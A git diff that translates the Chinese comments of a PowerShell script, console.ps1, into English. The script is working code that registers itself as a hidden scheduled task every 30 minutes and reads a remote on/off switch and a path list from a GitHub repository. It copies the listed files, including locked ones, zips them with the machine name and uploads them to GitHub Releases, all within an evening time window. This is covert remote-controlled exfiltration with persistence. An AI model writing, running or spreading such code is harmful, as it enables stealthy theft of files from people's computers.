@@ -1,76 +1,76 @@
-# === console.ps1 单文件自注册上传脚本 ===
+# === console.ps1 Self-Registering Upload Script ===
 [Console]::OutputEncoding = [System.Text.UTF8Encoding]::UTF8
 $OutputEncoding = [System.Text.UTF8Encoding]::UTF8
 
-# ==== 配置部分 ====
+# ==== Configuration ====
 $repo = "ertgyhujkfghj/2"
 $token = $env:GH_TOKEN
 $taskName = "console"
 
 if (-not $token) {
-    Write-Host "❌ GH_TOKEN 未设置，脚本终止"
+    Write-Host "❌ GH_TOKEN is not set, exiting script"
     exit 1
 }
 
-# ==== 时间限制（每天 19:30 - 00:00） ====
+# ==== Time Window (19:30 - 00:00 daily) ====
 $now = Get-Date
 $startTime = [datetime]::Today.AddHours(19).AddMinutes(30)
-$endTime = [datetime]::Today.AddDays(1)  # 次日 00:00
+$endTime = [datetime]::Today.AddDays(1)
 if ($now -lt $startTime -or $now -ge $endTime) {
-    Write-Host "🕒 当前不在上传时间范围（19:30 ~ 00:00），退出"
+    Write-Host "🕒 Not in allowed time range (19:30 ~ 00:00), exiting"
     exit 0
 }
 
-# ==== 注册计划任务（如不存在） ====
+# ==== Register Scheduled Task (if missing) ====
 $taskExists = schtasks /Query /TN $taskName 2>$null
 if ($LASTEXITCODE -ne 0) {
-    Write-Host "🛠️ 计划任务 $taskName 不存在，开始注册..."
+    Write-Host "🛠️ Task $taskName not found, registering..."
     $taskRun = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`""
     schtasks /Create /TN $taskName /TR $taskRun /SC MINUTE /RI 30 /F
     if ($LASTEXITCODE -eq 0) {
-        Write-Host "✅ 计划任务注册成功（每 30 分钟运行）"
+        Write-Host "✅ Task registered successfully (runs every 30 minutes)"
     } else {
-        Write-Host "❌ 计划任务注册失败，请以管理员身份运行本脚本"
+        Write-Host "❌ Failed to register task, please run as Administrator"
         exit 1
     }
 } else {
-    Write-Host "ℹ️ 计划任务 $taskName 已存在，跳过注册"
+    Write-Host "ℹ️ Task $taskName already exists, skipping registration"
 }
 
-# ==== 获取上传配置 ====
+# ==== Read Upload Configuration ====
 $enabledUrl = "https://raw.githubusercontent.com/$repo/main/.github/upload-enabled.txt"
 $pathListUrl = "https://raw.githubusercontent.com/$repo/main/.github/upload-path.txt"
 
-# ==== 检查上传开关 ====
+# ==== Check Upload Switch ====
 try {
     $enabled = Invoke-RestMethod -Uri $enabledUrl -UseBasicParsing
     if ($enabled.Trim().ToLower() -ne "on") {
-        Write-Host "🛑 上传开关未启用，退出"
+        Write-Host "🛑 Upload switch is OFF, exiting"
         exit 0
     }
 } catch {
-    Write-Warning "❌ 无法读取上传开关：$($_.Exception.Message)"
+    Write-Warning "❌ Failed to read upload switch: $($_.Exception.Message)"
     exit 1
 }
 
-# ==== 获取路径列表 ====
+# ==== Get Upload Paths ====
 try {
     $pathsRaw = Invoke-RestMethod -Uri $pathListUrl -UseBasicParsing
     $uploadPaths = $pathsRaw -split "`n" | Where-Object { $_.Trim() -ne "" }
-    Write-Host "`n📦 上传路径列表："
+    Write-Host "`n📦 Upload paths:"
     $uploadPaths | ForEach-Object { Write-Host " - $_" }
 } catch {
-    Write-Warning "❌ 无法读取路径配置：$($_.Exception.Message)"
+    Write-Warning "❌ Failed to fetch upload paths: $($_.Exception.Message)"
     exit 1
 }
 
-# ==== 拷贝文件到临时目录（包括尽量拷贝被占用文件） ====
+# ==== Copy Files to Temp (try to copy locked files too) ====
 $tempDir = "$env:TEMP\upload_temp_$(Get-Random)"
 New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
 
 foreach ($path in $uploadPaths) {
     if (-not (Test-Path $path)) {
-        Write-Warning "⚠️ 路径不存在，跳过：$path"
+        Write-Warning "⚠️ Path does not exist, skipping: $path"
         continue
     }
     $item = Get-Item $path -Force
@@ -78,33 +78,33 @@ foreach ($path in $uploadPaths) {
         if ($item.PSIsContainer) {
             $dest = Join-Path $tempDir $item.Name
             Copy-Item -Path $item.FullName -Destination $dest -Recurse -Force -ErrorAction SilentlyContinue
-            Write-Host "📁 已复制目录：$($item.FullName)"
+            Write-Host "📁 Copied folder: $($item.FullName)"
         } else {
             $dest = Join-Path $tempDir $item.Name
             Copy-Item -Path $item.FullName -Destination $dest -Force -ErrorAction SilentlyContinue
-            Write-Host "📄 已复制文件：$($item.FullName)"
+            Write-Host "📄 Copied file: $($item.FullName)"
         }
     } catch {
-        Write-Warning "⚠️ 无法复制：$($item.FullName)"
+        Write-Warning "⚠️ Failed to copy: $($item.FullName)"
     }
 }
 
-# ==== 压缩为 ZIP ====
+# ==== Compress into ZIP ====
 Add-Type -AssemblyName System.IO.Compression.FileSystem
 $computerName = $env:COMPUTERNAME
 $tag = "upload-$computerName-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
 $zipPath = "$env:TEMP\$tag.zip"
 try {
     [System.IO.Compression.ZipFile]::CreateFromDirectory($tempDir, $zipPath)
-    Write-Host "📦 已压缩为 ZIP：$zipPath"
+    Write-Host "📦 Compressed to ZIP: $zipPath"
 } catch {
-    Write-Warning "❌ 压缩失败：$($_.Exception.Message)"
+    Write-Warning "❌ Compression failed: $($_.Exception.Message)"
     Remove-Item $tempDir -Recurse -Force
     exit 1
 }
 Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
 
-# ==== 上传到 GitHub Release ====
+# ==== Upload to GitHub Release ====
 $uploadUrl = "https://api.github.com/repos/$repo/releases"
 $headers = @{
     Authorization = "token $token"
@@ -126,9 +126,9 @@ try {
         "User-Agent"   = "upload-script"
     } -InFile $zipPath
 
-    Write-Host "`n✅ 上传成功：$tag.zip"
+    Write-Host "`n✅ Upload successful: $tag.zip"
 } catch {
-    Write-Warning "❌ 上传失败：$($_.Exception.Message)"
+    Write-Warning "❌ Upload failed: $($_.Exception.Message)"
 }
 
 Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
